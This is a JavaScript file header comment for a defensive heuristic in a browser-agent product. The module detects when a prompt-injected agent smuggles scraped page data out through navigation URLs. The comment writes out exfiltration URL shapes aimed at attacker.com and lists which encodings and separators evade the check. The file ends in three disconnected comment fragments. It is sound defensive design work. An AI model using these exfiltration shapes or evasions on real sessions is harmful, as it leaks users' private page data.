// @ts-check
// egress-heuristics: best-effort detection of the DOM-data→request
// exfiltration shape in browser-session and actor-fetch arguments. A
// TRIPWIRE, not a proof.
//
// WHY THIS EXISTS (#243). The egress-allowlist PreToolUse hook
// (tools/hooks/defaults/egress-allowlist.js) governs the agent's OWN
// outbound fetches, but EXEMPTS every primitive:'tab' tool — those act on
// the user's logged-in browser, which is peerd's whole thesis. That
// exemption is a gap: a prompt-injected turn can smuggle scraped page data
// OUT through a tab tool by navigating (or typing) to a URL that carries the
// data — `attacker.com/?data=<scraped>`, `attacker.com/<scraped>`,
// `attacker.com/#<scraped>`, `https://<scraped>@attacker.com/` (userinfo,
// sent as an Authorization: Basic header), or `https://<scraped>.attacker.com/`
// (DNS-label exfil — the host leaks to the attacker's authoritative DNS +
// TLS SNI + Host header). The URL is off-origin and the tab stack never
// looked at it. This module is the ARGS-half tripwire for that shape.
//
// WHAT IT IS / IS NOT — read this before trusting it. It is a PURE function
// producing allow | block from (name, args, currentOrigin). It is a
// BEST-EFFORT TRIPWIRE layered UNDER the real containment, NOT a guarantee.
// Be precise about what that containment actually is on the shipped build,
// because an earlier draft of this comment cited two defenses that do not
// cover this vector and one that ships OFF:
//   - the offscreen HEAP FENCE is the real one, and it is unconditional: a
//     hijacked actor reasons in a worker holding no vault DK, no chrome.*, and
//     no engine clients, so what it can exfiltrate is bounded by what the page
//     already showed it;
//   - #242 forces a CONFIRM on an authenticated write inside a UGC zone. It is
//     NOT a read-only downscale (that design was considered and rejected —
//     see actor/ugc-registry.js), and it deliberately EXEMPTS navigation, so
//     it does not cover residual 1 below;
//   - #241 constrains the actor's REPLY to the orchestrator, not the tool-arg
//     surface, and ships default-OFF on both channels. Do not count it here.
// This heuristic is a cheap extra veto that catches the OBVIOUS shape early —
// it narrows the attack, it does not close it. Because it is
// not the floor, it is deliberately CONSERVATIVE — it ALLOWS on any
// uncertainty and only BLOCKS a clear payload — since a false block breaks
// the legitimate "read a page, then follow a link on it" flow that is the
// whole point of a browser agent.
//
// DETECTION MODEL — a single DOMINANT high-entropy run over the off-origin
// http(s) destination's three LOW-FALSE-POSITIVE slots: USERINFO, HOSTNAME,
// and PATH. Split each into runs of the URL-SAFE alphabet `A-Za-z0-9_-` (so
// `+`, `/`, `.`, `=`, `&`, space … are run boundaries), keep runs whose local
// entropy clears the bar, and BLOCK when the LONGEST such run reaches
// MIN_BLOB_LENGTH. A scraped-DOM payload dumped into one of these slots is one
// long contiguous token — a shape that has essentially NO legitimate
// population in userinfo or hostname, and only rare ones in a path.
//
// WHY ONLY THESE THREE SLOTS — the query and fragment are DELIBERATELY NOT
// scanned. That is the load-bearing decision, learned the hard way: the query
// and fragment are where legitimate long high-entropy tokens LIVE, and they
// are INDISTINGUISHABLE from an exfil blob by length or entropy —
//   • an OIDC `id_token` (a base64url JWT, often 300–800 chars) returned in
//     the fragment by the implicit/hybrid flow;
//   • a SAML `SAMLRequest` (DEFLATE + standard base64), 200–800 chars;
//   • base64url SPA continuation / pagination tokens on every infinite scroll;
//   • presigned-URL signatures (a GCS V4 `X-Goog-Signature` is 512 hex chars).
// Scanning the query/fragment would FALSE-BLOCK federated login and ordinary
// SPA navigation — a prime-directive violation for a browser agent (this
// module errs toward allow; a false block breaks the user's browsing, a false
// negative is backstopped by #241/#242). Userinfo and hostname carry no such
// legitimate blobs, and a path is normally `/`-segmented into short pieces, so
// those three slots flag the exfil shape without breaking real flows.
//
// ACTOR fetch_url REQUEST PAYLOADS. A fetch body or header value does not share
// the URL query's legitimate OAuth / presigned-link population: it is an
// explicit payload sent to the chosen destination. For an off-origin fetch_url
// call, scan transmitted header names + string values and the body with the SAME
// dominant-run test. Object bodies are scanned in their JSON wire shape. Header
// names are usually structural, but Fetch permits long token-shaped names; an
// attacker can put the payload there just as easily as in the value.
//
// WHAT SPARES A PATH: the `/` boundaries, the 100-char length bar, AND — since
// the prose rule landed — the SHAPE of the run. This paragraph used to say the
// opposite ("NOT readability ... real slugs cluster at 70-95 chars and pass"),
// and both halves were wrong: Guardian and TechCrunch permalinks routinely
// exceed 100 characters in one hyphen-joined run, so a user asking peerd to
// read the news got "likely DOM-data exfiltration". Readability now DOES exempt
// a run, decided by separator density rather than by entropy — see
// looksLikeProse for why entropy cannot make that call and what the measured
// error rates are. A large-multihash IPFS subdomain CID collapsing past 100 in
// the host remains an accepted-cost false block.
//
// WHY URL-SAFE alphabet, and why the HOSTNAME is dot-collapsed:
//   - base64url + hex are the URL-SAFE encodings a WORKING URL exfil uses
//     (they survive transit intact). `+`/`/` are run BOUNDARIES because they
//     are URL/form-structural — which lets a deep READABLE path split per `/`
//     segment (no false block). A STANDARD base64 (`btoa`, `+/`) blob thus
//     self-fragments and is a REAL residual: measured against this module, a
//     150-char standard-base64 blob of RANDOM BYTES in the PATH blocks only
//     ~11% of the time (the tail where 100+ consecutive chars happen to avoid
//     both symbols), versus ~100% for base64url. An earlier version of this
//     comment called it "moot ... it would only matter in the query/fragment,
//     which we do not scan anyway" — which is wrong, because the path IS scanned
//     (payloadSlots below) and the path is where a URL exfil actually goes.
//     STATE THE POPULATION, because these rates are not properties of the
//     encoding alone: the same standard-base64 blob blocks 80–100% of the time
//     when it encodes TEXT rather than random bytes (text spends fewer
//     characters on `+`/`/`), and the ~11% figure is the pessimistic end. The
//     same sensitivity ran the other way for hex and USED to be a hole — this
//     comment claimed "~100% for base64url and hex", which held only for random
//     bytes; hex of scraped TEXT measured 0–13% because its entropy falls under
//     the gate. That is why HEX_RUN now skips the entropy check entirely.
//     Named properly because the obvious fix — dropping `+`/`/` from RUN_SPLIT
//     — would re-break the long-readable-path false block that the prose rule
//     in looksLikeProse and the article-slug tests exist to prevent.
//   - the hostname is scanned with its DOTS REMOVED (labels concatenated) so a
//     payload chunked across DNS labels (`<h1>.<h2>.<h3>.attacker.com`, each
//     ≤63 by protocol) re-fuses into one run instead of evading on the dots. A
//     normal hostname collapses to a short / low-entropy string, never tripped.
//
// WHY DOMINANT-RUN AND NOT SUMMED VOLUME. Measuring only the LONGEST run (not
// the sum) is what keeps a path that legitimately carries several independent
// high-entropy segments from being blocked for their combined length; only a
// single dumped blob trips it. (Summing was an earlier revision; it and query-
// scanning both false-blocked OAuth/OIDC-family flows, which is why neither
// survives.)
//
// KNOWN RESIDUALS — do NOT read this as complete coverage:
//   1. THE QUERY AND FRAGMENT. `attacker.com/?d=<blob>` / `#<blob>` is NOT
//      caught — see WHY ONLY THESE THREE SLOTS. This is the largest residual,
//      a deliberate trade to never false-block a login/navigation. NOTHING
//      else covers it: #242 exempts navigation by design, so an off-origin
//      `navigate` with the payload in the query is the arc's one uncontained
//      path. It is not a regression (it predates this module) but it IS the
//      canonical exfil GET, and closing it — most likely by narrowing #242's
//      navigation exemption to same-origin hops while on a UGC page — is the
//      next piece of work, not a solved problem.
//   2. FRAGMENTATION. A payload split across separators so no single run
//      reaches MIN_BLOB_LENGTH (`.`-separated path/label runs, standard-base64
//      `+/` self-fragmentation, fine sub-entropy runs) evades.
//   3. LOW-ENTROPY or SMALL payloads. Data whose OWN entropy is under the gate
//      (a repeated segment, a short natural-language leak) or a single
//      high-entropy token under MIN_BLOB_LENGTH slips through — entropy
//      detection cannot see data that does not look random. HEX is the one
//      encoding carved out of this (HEX_RUN), because hex of ordinary text
//      lands under the gate while being a perfectly working exfil; every other
//      under-gate encoding remains uncaught.
// None of these residuals is CONTAINED elsewhere — the heap fence bounds what
// a hijacked actor knows, and nothing downstream inspects the URL again. Treat
// them as accepted exposure, not as covered. A rare legitimate LONG single run
// that DOES trip the wire — a ≥100-char single PATH segment (an email
// click-tracking wrapper, a magic-link, a path-embedded JWT, OR a genuinely
// long readable slug/title), or a large-multihash IPFS subdomain CID that
// collapses past 100 chars in the HOST — is the accepted cost of catching the
// contiguous-blob shape; #242 is the real containment.
//
// SCOPE. Browser-session tool args plus actor fetch_url request payloads. It
// does NOT cover the page-emitted
// `<img src="attacker.com/?d=…">` beacon vector: that data leaves via the
// page's own network stack, not a tab-tool arg, so no arg-inspection can see
// it. Beacons need a declarativeNetRequest layer — a separate follow-up.

// stayed at 100% throughout. So the one encoding the header singled out as
// covered was the cheapest way past it, and the tests missed it because their

// Hex therefore skips the entropy gate and is judged on length alone. That is
